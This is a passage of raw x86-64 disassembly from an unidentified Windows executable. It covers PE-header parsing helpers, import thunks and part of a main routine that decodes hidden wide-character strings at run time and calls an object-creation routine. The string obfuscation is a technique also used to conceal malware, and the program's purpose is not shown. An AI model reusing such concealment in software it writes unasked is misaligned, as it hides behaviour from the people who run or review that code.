   140003bc2:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140003bc7:	75 1a                	jne    0x140003be3
   140003bc9:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140003bcd:	48 01 d1             	add    %rdx,%rcx
   140003bd0:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140003bd6:	75 0b                	jne    0x140003be3
   140003bd8:	31 c0                	xor    %eax,%eax
   140003bda:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   140003be0:	0f 94 c0             	sete   %al
   140003be3:	c3                   	ret
   140003be4:	45 31 c0             	xor    %r8d,%r8d
   140003be7:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140003beb:	48 01 c1             	add    %rax,%rcx
   140003bee:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140003bf2:	44 0f b7 49 06       	movzwl 0x6(%rcx),%r9d
   140003bf7:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   140003bfc:	45 39 c8             	cmp    %r9d,%r8d
   140003bff:	73 1d                	jae    0x140003c1e
   140003c01:	44 8b 50 0c          	mov    0xc(%rax),%r10d
   140003c05:	4c 89 d1             	mov    %r10,%rcx
   140003c08:	4c 39 d2             	cmp    %r10,%rdx
   140003c0b:	72 08                	jb     0x140003c15
   140003c0d:	03 48 08             	add    0x8(%rax),%ecx
   140003c10:	48 39 ca             	cmp    %rcx,%rdx
   140003c13:	72 0b                	jb     0x140003c20
   140003c15:	41 ff c0             	inc    %r8d
   140003c18:	48 83 c0 28          	add    $0x28,%rax
   140003c1c:	eb de                	jmp    0x140003bfc
   140003c1e:	31 c0                	xor    %eax,%eax
   140003c20:	c3                   	ret
   140003c21:	55                   	push   %rbp
   140003c22:	57                   	push   %rdi
   140003c23:	56                   	push   %rsi
   140003c24:	53                   	push   %rbx
   140003c25:	48 83 ec 28          	sub    $0x28,%rsp
   140003c29:	31 db                	xor    %ebx,%ebx
   140003c2b:	48 89 ce             	mov    %rcx,%rsi
   140003c2e:	e8 05 03 00 00       	call   0x140003f38
   140003c33:	48 83 f8 08          	cmp    $0x8,%rax
   140003c37:	77 4c                	ja     0x140003c85
   140003c39:	4c 8b 05 70 47 57 00 	mov    0x574770(%rip),%r8        # 0x1405783b0
   140003c40:	4c 89 c1             	mov    %r8,%rcx
   140003c43:	e8 78 ff ff ff       	call   0x140003bc0
   140003c48:	85 c0                	test   %eax,%eax
   140003c4a:	74 39                	je     0x140003c85
   140003c4c:	49 63 40 3c          	movslq 0x3c(%r8),%rax
   140003c50:	31 ff                	xor    %edi,%edi
   140003c52:	4c 01 c0             	add    %r8,%rax
   140003c55:	0f b7 50 14          	movzwl 0x14(%rax),%edx
   140003c59:	0f b7 68 06          	movzwl 0x6(%rax),%ebp
   140003c5d:	48 8d 5c 10 18       	lea    0x18(%rax,%rdx,1),%rbx
   140003c62:	39 ef                	cmp    %ebp,%edi
   140003c64:	73 1d                	jae    0x140003c83
   140003c66:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140003c6c:	48 89 f2             	mov    %rsi,%rdx
   140003c6f:	48 89 d9             	mov    %rbx,%rcx
   140003c72:	e8 c9 02 00 00       	call   0x140003f40
   140003c77:	85 c0                	test   %eax,%eax
   140003c79:	74 0a                	je     0x140003c85
   140003c7b:	ff c7                	inc    %edi
   140003c7d:	48 83 c3 28          	add    $0x28,%rbx
   140003c81:	eb df                	jmp    0x140003c62
   140003c83:	31 db                	xor    %ebx,%ebx
   140003c85:	48 89 d8             	mov    %rbx,%rax
   140003c88:	48 83 c4 28          	add    $0x28,%rsp
   140003c8c:	5b                   	pop    %rbx
   140003c8d:	5e                   	pop    %rsi
   140003c8e:	5f                   	pop    %rdi
   140003c8f:	5d                   	pop    %rbp
   140003c90:	c3                   	ret
   140003c91:	48 83 ec 28          	sub    $0x28,%rsp
   140003c95:	4c 8b 0d 14 47 57 00 	mov    0x574714(%rip),%r9        # 0x1405783b0
   140003c9c:	49 89 c8             	mov    %rcx,%r8
   140003c9f:	4c 89 c9             	mov    %r9,%rcx
   140003ca2:	e8 19 ff ff ff       	call   0x140003bc0
   140003ca7:	85 c0                	test   %eax,%eax
   140003ca9:	74 12                	je     0x140003cbd
   140003cab:	4c 89 c2             	mov    %r8,%rdx
   140003cae:	4c 89 c9             	mov    %r9,%rcx
   140003cb1:	4c 29 ca             	sub    %r9,%rdx
   140003cb4:	48 83 c4 28          	add    $0x28,%rsp
   140003cb8:	e9 27 ff ff ff       	jmp    0x140003be4
   140003cbd:	31 c0                	xor    %eax,%eax
   140003cbf:	48 83 c4 28          	add    $0x28,%rsp
   140003cc3:	c3                   	ret
   140003cc4:	48 83 ec 28          	sub    $0x28,%rsp
   140003cc8:	4c 8b 05 e1 46 57 00 	mov    0x5746e1(%rip),%r8        # 0x1405783b0
   140003ccf:	4c 89 c1             	mov    %r8,%rcx
   140003cd2:	e8 e9 fe ff ff       	call   0x140003bc0
   140003cd7:	85 c0                	test   %eax,%eax
   140003cd9:	74 0a                	je     0x140003ce5
   140003cdb:	49 63 40 3c          	movslq 0x3c(%r8),%rax
   140003cdf:	42 0f b7 44 00 06    	movzwl 0x6(%rax,%r8,1),%eax
   140003ce5:	48 83 c4 28          	add    $0x28,%rsp
   140003ce9:	c3                   	ret
   140003cea:	48 83 ec 28          	sub    $0x28,%rsp
   140003cee:	4c 8b 0d bb 46 57 00 	mov    0x5746bb(%rip),%r9        # 0x1405783b0
   140003cf5:	49 89 c8             	mov    %rcx,%r8
   140003cf8:	4c 89 c9             	mov    %r9,%rcx
   140003cfb:	e8 c0 fe ff ff       	call   0x140003bc0
   140003d00:	89 c2                	mov    %eax,%edx
   140003d02:	31 c0                	xor    %eax,%eax
   140003d04:	85 d2                	test   %edx,%edx
   140003d06:	74 32                	je     0x140003d3a
   140003d08:	49 63 51 3c          	movslq 0x3c(%r9),%rdx
   140003d0c:	4c 01 ca             	add    %r9,%rdx
   140003d0f:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   140003d13:	0f b7 4a 06          	movzwl 0x6(%rdx),%ecx
   140003d17:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
   140003d1c:	31 d2                	xor    %edx,%edx
   140003d1e:	39 ca                	cmp    %ecx,%edx
   140003d20:	73 16                	jae    0x140003d38
   140003d22:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   140003d26:	74 08                	je     0x140003d30
   140003d28:	4d 85 c0             	test   %r8,%r8
   140003d2b:	74 0d                	je     0x140003d3a
   140003d2d:	49 ff c8             	dec    %r8
   140003d30:	ff c2                	inc    %edx
   140003d32:	48 83 c0 28          	add    $0x28,%rax
   140003d36:	eb e6                	jmp    0x140003d1e
   140003d38:	31 c0                	xor    %eax,%eax
   140003d3a:	48 83 c4 28          	add    $0x28,%rsp
   140003d3e:	c3                   	ret
   140003d3f:	48 83 ec 28          	sub    $0x28,%rsp
   140003d43:	48 8b 0d 66 46 57 00 	mov    0x574666(%rip),%rcx        # 0x1405783b0
   140003d4a:	e8 71 fe ff ff       	call   0x140003bc0
   140003d4f:	85 c0                	test   %eax,%eax
   140003d51:	b8 00 00 00 00       	mov    $0x0,%eax
   140003d56:	48 0f 45 05 52 46 57 	cmovne 0x574652(%rip),%rax        # 0x1405783b0
   140003d5d:	00 
   140003d5e:	48 83 c4 28          	add    $0x28,%rsp
   140003d62:	c3                   	ret
   140003d63:	48 83 ec 28          	sub    $0x28,%rsp
   140003d67:	4c 8b 0d 42 46 57 00 	mov    0x574642(%rip),%r9        # 0x1405783b0
   140003d6e:	49 89 c8             	mov    %rcx,%r8
   140003d71:	4c 89 c9             	mov    %r9,%rcx
   140003d74:	e8 47 fe ff ff       	call   0x140003bc0
   140003d79:	85 c0                	test   %eax,%eax
   140003d7b:	74 20                	je     0x140003d9d
   140003d7d:	4c 89 c2             	mov    %r8,%rdx
   140003d80:	4c 89 c9             	mov    %r9,%rcx
   140003d83:	4c 29 ca             	sub    %r9,%rdx
   140003d86:	e8 59 fe ff ff       	call   0x140003be4
   140003d8b:	48 89 c2             	mov    %rax,%rdx
   140003d8e:	31 c0                	xor    %eax,%eax
   140003d90:	48 85 d2             	test   %rdx,%rdx
   140003d93:	74 08                	je     0x140003d9d
   140003d95:	8b 42 24             	mov    0x24(%rdx),%eax
   140003d98:	f7 d0                	not    %eax
   140003d9a:	c1 e8 1f             	shr    $0x1f,%eax
   140003d9d:	48 83 c4 28          	add    $0x28,%rsp
   140003da1:	c3                   	ret
   140003da2:	53                   	push   %rbx
   140003da3:	48 83 ec 20          	sub    $0x20,%rsp
   140003da7:	4c 8b 1d 02 46 57 00 	mov    0x574602(%rip),%r11        # 0x1405783b0
   140003dae:	89 cb                	mov    %ecx,%ebx
   140003db0:	4c 89 d9             	mov    %r11,%rcx
   140003db3:	e8 08 fe ff ff       	call   0x140003bc0
   140003db8:	89 c2                	mov    %eax,%edx
   140003dba:	31 c0                	xor    %eax,%eax
   140003dbc:	85 d2                	test   %edx,%edx
   140003dbe:	74 45                	je     0x140003e05
   140003dc0:	49 63 43 3c          	movslq 0x3c(%r11),%rax
   140003dc4:	42 8b 94 18 90 00 00 	mov    0x90(%rax,%r11,1),%edx
   140003dcb:	00 
   140003dcc:	31 c0                	xor    %eax,%eax
   140003dce:	85 d2                	test   %edx,%edx
   140003dd0:	74 33                	je     0x140003e05
   140003dd2:	4c 89 d9             	mov    %r11,%rcx
   140003dd5:	e8 0a fe ff ff       	call   0x140003be4
   140003dda:	48 85 c0             	test   %rax,%rax
   140003ddd:	74 26                	je     0x140003e05
   140003ddf:	4a 8d 04 1a          	lea    (%rdx,%r11,1),%rax
   140003de3:	83 78 04 00          	cmpl   $0x0,0x4(%rax)
   140003de7:	75 06                	jne    0x140003def
   140003de9:	83 78 0c 00          	cmpl   $0x0,0xc(%rax)
   140003ded:	74 14                	je     0x140003e03
   140003def:	85 db                	test   %ebx,%ebx
   140003df1:	7f 08                	jg     0x140003dfb
   140003df3:	8b 40 0c             	mov    0xc(%rax),%eax
   140003df6:	4c 01 d8             	add    %r11,%rax
   140003df9:	eb 0a                	jmp    0x140003e05
   140003dfb:	ff cb                	dec    %ebx
   140003dfd:	48 83 c0 14          	add    $0x14,%rax
   140003e01:	eb e0                	jmp    0x140003de3
   140003e03:	31 c0                	xor    %eax,%eax
   140003e05:	48 83 c4 20          	add    $0x20,%rsp
   140003e09:	5b                   	pop    %rbx
   140003e0a:	c3                   	ret
   140003e0b:	90                   	nop
   140003e0c:	90                   	nop
   140003e0d:	90                   	nop
   140003e0e:	90                   	nop
   140003e0f:	90                   	nop
   140003e10:	51                   	push   %rcx
   140003e11:	50                   	push   %rax
   140003e12:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140003e18:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140003e1d:	72 19                	jb     0x140003e38
   140003e1f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140003e26:	48 83 09 00          	orq    $0x0,(%rcx)
   140003e2a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   140003e30:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140003e36:	77 e7                	ja     0x140003e1f
   140003e38:	48 29 c1             	sub    %rax,%rcx
   140003e3b:	48 83 09 00          	orq    $0x0,(%rcx)
   140003e3f:	58                   	pop    %rax
   140003e40:	59                   	pop    %rcx
   140003e41:	c3                   	ret
   140003e42:	90                   	nop
   140003e43:	90                   	nop
   140003e44:	90                   	nop
   140003e45:	90                   	nop
   140003e46:	90                   	nop
   140003e47:	90                   	nop
   140003e48:	90                   	nop
   140003e49:	90                   	nop
   140003e4a:	90                   	nop
   140003e4b:	90                   	nop
   140003e4c:	90                   	nop
   140003e4d:	90                   	nop
   140003e4e:	90                   	nop
   140003e4f:	90                   	nop
   140003e50:	48 8b 05 89 45 57 00 	mov    0x574589(%rip),%rax        # 0x1405783e0
   140003e57:	48 8b 00             	mov    (%rax),%rax
   140003e5a:	c3                   	ret
   140003e5b:	90                   	nop
   140003e5c:	90                   	nop
   140003e5d:	90                   	nop
   140003e5e:	90                   	nop
   140003e5f:	90                   	nop
   140003e60:	48 8b 05 69 45 57 00 	mov    0x574569(%rip),%rax        # 0x1405783d0
   140003e67:	48 8b 00             	mov    (%rax),%rax
   140003e6a:	c3                   	ret
   140003e6b:	90                   	nop
   140003e6c:	90                   	nop
   140003e6d:	90                   	nop
   140003e6e:	90                   	nop
   140003e6f:	90                   	nop
   140003e70:	48 8b 05 99 86 57 00 	mov    0x578699(%rip),%rax        # 0x14057c510
   140003e77:	c3                   	ret
   140003e78:	48 89 c8             	mov    %rcx,%rax
   140003e7b:	48 87 05 8e 86 57 00 	xchg   %rax,0x57868e(%rip)        # 0x14057c510
   140003e82:	c3                   	ret
   140003e83:	90                   	nop
   140003e84:	90                   	nop
   140003e85:	90                   	nop
   140003e86:	90                   	nop
   140003e87:	90                   	nop
   140003e88:	90                   	nop
   140003e89:	90                   	nop
   140003e8a:	90                   	nop
   140003e8b:	90                   	nop
   140003e8c:	90                   	nop
   140003e8d:	90                   	nop
   140003e8e:	90                   	nop
   140003e8f:	90                   	nop
   140003e90:	53                   	push   %rbx
   140003e91:	48 83 ec 20          	sub    $0x20,%rsp
   140003e95:	89 cb                	mov    %ecx,%ebx
   140003e97:	e8 24 00 00 00       	call   0x140003ec0
   140003e9c:	48 6b db 30          	imul   $0x30,%rbx,%rbx
   140003ea0:	48 01 d8             	add    %rbx,%rax
   140003ea3:	48 83 c4 20          	add    $0x20,%rsp
   140003ea7:	5b                   	pop    %rbx
   140003ea8:	c3                   	ret
   140003ea9:	90                   	nop
   140003eaa:	90                   	nop
   140003eab:	90                   	nop
   140003eac:	90                   	nop
   140003ead:	90                   	nop
   140003eae:	90                   	nop
   140003eaf:	90                   	nop
   140003eb0:	ff 25 32 93 57 00    	jmp    *0x579332(%rip)        # 0x14057d1e8
   140003eb6:	90                   	nop
   140003eb7:	90                   	nop
   140003eb8:	ff 25 32 93 57 00    	jmp    *0x579332(%rip)        # 0x14057d1f0
   140003ebe:	90                   	nop
   140003ebf:	90                   	nop
   140003ec0:	ff 25 3a 93 57 00    	jmp    *0x57933a(%rip)        # 0x14057d200
   140003ec6:	90                   	nop
   140003ec7:	90                   	nop
   140003ec8:	ff 25 3a 93 57 00    	jmp    *0x57933a(%rip)        # 0x14057d208
   140003ece:	90                   	nop
   140003ecf:	90                   	nop
   140003ed0:	ff 25 3a 93 57 00    	jmp    *0x57933a(%rip)        # 0x14057d210
   140003ed6:	90                   	nop
   140003ed7:	90                   	nop
   140003ed8:	ff 25 3a 93 57 00    	jmp    *0x57933a(%rip)        # 0x14057d218
   140003ede:	90                   	nop
   140003edf:	90                   	nop
   140003ee0:	ff 25 3a 93 57 00    	jmp    *0x57933a(%rip)        # 0x14057d220
   140003ee6:	90                   	nop
   140003ee7:	90                   	nop
   140003ee8:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d238
   140003eee:	90                   	nop
   140003eef:	90                   	nop
   140003ef0:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d240
   140003ef6:	90                   	nop
   140003ef7:	90                   	nop
   140003ef8:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d248
   140003efe:	90                   	nop
   140003eff:	90                   	nop
   140003f00:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d250
   140003f06:	90                   	nop
   140003f07:	90                   	nop
   140003f08:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d258
   140003f0e:	90                   	nop
   140003f0f:	90                   	nop
   140003f10:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d260
   140003f16:	90                   	nop
   140003f17:	90                   	nop
   140003f18:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d268
   140003f1e:	90                   	nop
   140003f1f:	90                   	nop
   140003f20:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d270
   140003f26:	90                   	nop
   140003f27:	90                   	nop
   140003f28:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d278
   140003f2e:	90                   	nop
   140003f2f:	90                   	nop
   140003f30:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d280
   140003f36:	90                   	nop
   140003f37:	90                   	nop
   140003f38:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d288
   140003f3e:	90                   	nop
   140003f3f:	90                   	nop
   140003f40:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d290
   140003f46:	90                   	nop
   140003f47:	90                   	nop
   140003f48:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d298
   140003f4e:	90                   	nop
   140003f4f:	90                   	nop
   140003f50:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d2a0
   140003f56:	90                   	nop
   140003f57:	90                   	nop
   140003f58:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d2a8
   140003f5e:	90                   	nop
   140003f5f:	90                   	nop
   140003f60:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d2b0
   140003f66:	90                   	nop
   140003f67:	90                   	nop
   140003f68:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d2b8
   140003f6e:	90                   	nop
   140003f6f:	90                   	nop
   140003f70:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d2c0
   140003f76:	90                   	nop
   140003f77:	90                   	nop
   140003f78:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d2c8
   140003f7e:	90                   	nop
   140003f7f:	90                   	nop
   140003f80:	ff 25 4a 93 57 00    	jmp    *0x57934a(%rip)        # 0x14057d2d0
   140003f86:	90                   	nop
   140003f87:	90                   	nop
   140003f88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003f8f:	00 
   140003f90:	ff 25 42 92 57 00    	jmp    *0x579242(%rip)        # 0x14057d1d8
   140003f96:	90                   	nop
   140003f97:	90                   	nop
   140003f98:	ff 25 32 92 57 00    	jmp    *0x579232(%rip)        # 0x14057d1d0
   140003f9e:	90                   	nop
   140003f9f:	90                   	nop
   140003fa0:	ff 25 22 92 57 00    	jmp    *0x579222(%rip)        # 0x14057d1c8
   140003fa6:	90                   	nop
   140003fa7:	90                   	nop
   140003fa8:	ff 25 12 92 57 00    	jmp    *0x579212(%rip)        # 0x14057d1c0
   140003fae:	90                   	nop
   140003faf:	90                   	nop
   140003fb0:	ff 25 02 92 57 00    	jmp    *0x579202(%rip)        # 0x14057d1b8
   140003fb6:	90                   	nop
   140003fb7:	90                   	nop
   140003fb8:	ff 25 f2 91 57 00    	jmp    *0x5791f2(%rip)        # 0x14057d1b0
   140003fbe:	90                   	nop
   140003fbf:	90                   	nop
   140003fc0:	ff 25 e2 91 57 00    	jmp    *0x5791e2(%rip)        # 0x14057d1a8
   140003fc6:	90                   	nop
   140003fc7:	90                   	nop
   140003fc8:	ff 25 d2 91 57 00    	jmp    *0x5791d2(%rip)        # 0x14057d1a0
   140003fce:	90                   	nop
   140003fcf:	90                   	nop
   140003fd0:	ff 25 c2 91 57 00    	jmp    *0x5791c2(%rip)        # 0x14057d198
   140003fd6:	90                   	nop
   140003fd7:	90                   	nop
   140003fd8:	ff 25 b2 91 57 00    	jmp    *0x5791b2(%rip)        # 0x14057d190
   140003fde:	90                   	nop
   140003fdf:	90                   	nop
   140003fe0:	41 57                	push   %r15
   140003fe2:	b8 b8 1f 00 00       	mov    $0x1fb8,%eax
   140003fe7:	41 56                	push   %r14
   140003fe9:	41 55                	push   %r13
   140003feb:	41 54                	push   %r12
   140003fed:	55                   	push   %rbp
   140003fee:	57                   	push   %rdi
   140003fef:	56                   	push   %rsi
   140003ff0:	53                   	push   %rbx
   140003ff1:	e8 1a fe ff ff       	call   0x140003e10
   140003ff6:	48 29 c4             	sub    %rax,%rsp
   140003ff9:	48 8d 35 20 30 57 00 	lea    0x573020(%rip),%rsi        # 0x140577020
   140004000:	48 8d 1d f9 80 57 00 	lea    0x5780f9(%rip),%rbx        # 0x14057c100
   140004007:	e8 52 f2 ff ff       	call   0x14000325e
   14000400c:	48 8d 84 24 b4 17 00 	lea    0x17b4(%rsp),%rax
   140004013:	00 
   140004014:	b9 56 00 00 00       	mov    $0x56,%ecx
   140004019:	80 3d c0 80 57 00 00 	cmpb   $0x0,0x5780c0(%rip)        # 0x14057c0e0
   140004020:	48 8d bc 24 b4 17 00 	lea    0x17b4(%rsp),%rdi
   140004027:	00 
   140004028:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000402d:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000402f:	75 27                	jne    0x140004058
   140004031:	b9 56 00 00 00       	mov    $0x56,%ecx
   140004036:	48 89 df             	mov    %rbx,%rdi
   140004039:	48 89 c6             	mov    %rax,%rsi
   14000403c:	c6 05 13 81 57 00 01 	movb   $0x1,0x578113(%rip)        # 0x14057c156
   140004043:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004045:	48 8d 0d 2f d3 ff ff 	lea    -0x2cd1(%rip),%rcx        # 0x14000137b
   14000404c:	c6 05 8d 80 57 00 01 	movb   $0x1,0x57808d(%rip)        # 0x14057c0e0
   140004053:	e8 dd d2 ff ff       	call   0x140001335
   140004058:	80 3d f7 80 57 00 00 	cmpb   $0x0,0x5780f7(%rip)        # 0x14057c156
   14000405f:	74 2d                	je     0x14000408e
   140004061:	48 8d 05 98 80 57 00 	lea    0x578098(%rip),%rax        # 0x14057c100
   140004068:	48 8d 50 56          	lea    0x56(%rax),%rdx
   14000406c:	66 8b 30             	mov    (%rax),%si
   14000406f:	48 83 c0 02          	add    $0x2,%rax
   140004073:	8d 8e 0d d5 ff ff    	lea    -0x2af3(%rsi),%ecx
   140004079:	66 81 e1 ff 00       	and    $0xff,%cx
   14000407e:	66 89 48 fe          	mov    %cx,-0x2(%rax)
   140004082:	48 39 c2             	cmp    %rax,%rdx
   140004085:	75 e5                	jne    0x14000406c
   140004087:	c6 05 c8 80 57 00 00 	movb   $0x0,0x5780c8(%rip)        # 0x14057c156
   14000408e:	48 8d b4 24 90 00 00 	lea    0x90(%rsp),%rsi
   140004095:	00 
   140004096:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000409c:	48 89 da             	mov    %rbx,%rdx
   14000409f:	48 89 f1             	mov    %rsi,%rcx
   1400040a2:	e8 93 d3 ff ff       	call   0x14000143a
   1400040a7:	45 31 c0             	xor    %r8d,%r8d
   1400040aa:	31 d2                	xor    %edx,%edx
   1400040ac:	31 c9                	xor    %ecx,%ecx
   1400040ae:	48 89 94 24 a8 00 00 	mov    %rdx,0xa8(%rsp)
   1400040b5:	00 
   1400040b6:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400040bc:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   1400040c1:	89 8c 24 b8 00 00 00 	mov    %ecx,0xb8(%rsp)
   1400040c8:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1400040cf:	00 
   1400040d0:	4c 89 84 24 c0 00 00 	mov    %r8,0xc0(%rsp)
   1400040d7:	00 
   1400040d8:	4c 89 84 24 c8 00 00 	mov    %r8,0xc8(%rsp)
   1400040df:	00 
   1400040e0:	4c 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%r8
   1400040e7:	00 
   1400040e8:	c7 84 24 a0 00 00 00 	movl   $0x30,0xa0(%rsp)
   1400040ef:	30 00 00 00 
   1400040f3:	48 89 b4 24 b0 00 00 	mov    %rsi,0xb0(%rsp)
   1400040fa:	00 
   1400040fb:	e8 7a f0 ff ff       	call   0x14000317a
   140004100:	85 c0                	test   %eax,%eax
   140004102:	0f 88 2e 14 00 00    	js     0x140005536
   140004108:	31 c9                	xor    %ecx,%ecx
   14000410a:	48 8d 94 24 88 00 00 	lea    0x88(%rsp),%rdx
   140004111:	00 
   140004112:	48 c7 84 24 88 00 00 	movq   $0xfffffffff70f2e80,0x88(%rsp)
   140004119:	00 80 2e 0f f7 
   14000411e:	48 8d bc 24 5c 01 00 	lea    0x15c(%rsp),%rdi
   140004125:	00 
   140004126:	e8 ec ef ff ff       	call   0x140003117
   14000412b:	48 8d b4 24 5c 01 00 	lea    0x15c(%rsp),%rsi
   140004132:	00 
   140004133:	e8 a0 e7 ff ff       	call   0x1400028d8
   140004138:	41 89 c5             	mov    %eax,%r13d
   14000413b:	e8 70 ec ff ff       	call   0x140002db0
   140004140:	b9 82 00 00 00       	mov    $0x82,%ecx
   140004145:	48 89 c3             	mov    %rax,%rbx
   140004148:	48 8b 40 20          	mov    0x20(%rax),%rax
   14000414c:	4c 8b a0 80 00 00 00 	mov    0x80(%rax),%r12
   140004153:	31 c0                	xor    %eax,%eax
   140004155:	80 3d 5c 7f 57 00 00 	cmpb   $0x0,0x577f5c(%rip)        # 0x14057c0b8
   14000415c:	f3 ab                	rep stos %eax,(%rdi)
   14000415e:	48 b8 84 00 8a 00 84 	movabs $0x850084008a0084,%rax
   140004165:	00 85 00 
   140004168:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   14000416f:	00 
   140004170:	48 b8 76 00 7e 00 83 	movabs $0x800083007e0076,%rax
   140004177:	00 80 00 
   14000417a:	48 89 84 24 bc 17 00 	mov    %rax,0x17bc(%rsp)
   140004181:	00 
   140004182:	48 b8 80 00 85 00 6e 	movabs $0x31006e00850080,%rax
   140004189:	00 31 00 
   14000418c:	48 89 84 24 c4 17 00 	mov    %rax,0x17c4(%rsp)
   140004193:	00 
   140004194:	75 30                	jne    0x1400041c6
   140004196:	0f 10 84 24 b4 17 00 	movups 0x17b4(%rsp),%xmm0
   14000419d:	00 
   14000419e:	48 8d 0d d5 d1 ff ff 	lea    -0x2e2b(%rip),%rcx        # 0x14000137a
   1400041a5:	c6 05 2c 7f 57 00 01 	movb   $0x1,0x577f2c(%rip)        # 0x14057c0d8
   1400041ac:	48 89 05 1d 7f 57 00 	mov    %rax,0x577f1d(%rip)        # 0x14057c0d0
   1400041b3:	c6 05 fe 7e 57 00 01 	movb   $0x1,0x577efe(%rip)        # 0x14057c0b8
   1400041ba:	0f 29 05 ff 7e 57 00 	movaps %xmm0,0x577eff(%rip)        # 0x14057c0c0
   1400041c1:	e8 6f d1 ff ff       	call   0x140001335
   1400041c6:	80 3d 0b 7f 57 00 00 	cmpb   $0x0,0x577f0b(%rip)        # 0x14057c0d8
   1400041cd:	48 8d 0d ec 7e 57 00 	lea    0x577eec(%rip),%rcx        # 0x14057c0c0
   1400041d4:	74 29                	je     0x1400041ff
   1400041d6:	48 89 c8             	mov    %rcx,%rax
   1400041d9:	4c 8d 41 18          	lea    0x18(%rcx),%r8
   1400041dd:	66 8b 38             	mov    (%rax),%di
   1400041e0:	48 83 c0 02          	add    $0x2,%rax
   1400041e4:	8d 97 cf 6f 00 00    	lea    0x6fcf(%rdi),%edx
   1400041ea:	66 81 e2 ff 00       	and    $0xff,%dx
   1400041ef:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400041f3:	49 39 c0             	cmp    %rax,%r8
   1400041f6:	75 e5                	jne    0x1400041dd
   1400041f8:	c6 05 d9 7e 57 00 00 	movb   $0x0,0x577ed9(%rip)        # 0x14057c0d8
   1400041ff:	48 89 ca             	mov    %rcx,%rdx
   140004202:	4c 89 e1             	mov    %r12,%rcx
   140004205:	48 8d bc 24 64 03 00 	lea    0x364(%rsp),%rdi
   14000420c:	00 
   14000420d:	e8 da e0 ff ff       	call   0x1400022ec
   140004212:	48 89 f1             	mov    %rsi,%rcx
   140004215:	48 89 c2             	mov    %rax,%rdx
   140004218:	e8 33 fd ff ff       	call   0x140003f50
   14000421d:	31 c0                	xor    %eax,%eax
   14000421f:	b9 82 00 00 00       	mov    $0x82,%ecx
   140004224:	80 3d 6d 7e 57 00 00 	cmpb   $0x0,0x577e6d(%rip)        # 0x14057c098
   14000422b:	f3 ab                	rep stos %eax,(%rdi)
   14000422d:	48 b8 5f 00 56 00 7c 	movabs $0x76007c0056005f,%rax
   140004234:	00 76 00 
   140004237:	c7 84 24 c4 17 00 00 	movl   $0x30035,0x17c4(%rsp)
   14000423e:	35 00 03 00 
   140004242:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   140004249:	00 
   14000424a:	48 b8 77 00 68 00 70 	movabs $0x36007000680077,%rax
   140004251:	00 36 00 
   140004254:	48 89 84 24 bc 17 00 	mov    %rax,0x17bc(%rsp)
   14000425b:	00 
   14000425c:	48 8d 84 24 64 03 00 	lea    0x364(%rsp),%rax
   140004263:	00 
   140004264:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004269:	75 33                	jne    0x14000429e
   14000426b:	0f 10 8c 24 b4 17 00 	movups 0x17b4(%rsp),%xmm1
   140004272:	00 
   140004273:	48 8d 0d ff d0 ff ff 	lea    -0x2f01(%rip),%rcx        # 0x140001379
   14000427a:	c6 05 33 7e 57 00 01 	movb   $0x1,0x577e33(%rip)        # 0x14057c0b4
   140004281:	c7 05 25 7e 57 00 35 	movl   $0x30035,0x577e25(%rip)        # 0x14057c0b0
   140004288:	00 03 00 
   14000428b:	c6 05 06 7e 57 00 01 	movb   $0x1,0x577e06(%rip)        # 0x14057c098
   140004292:	0f 29 0d 07 7e 57 00 	movaps %xmm1,0x577e07(%rip)        # 0x14057c0a0
   140004299:	e8 97 d0 ff ff       	call   0x140001335
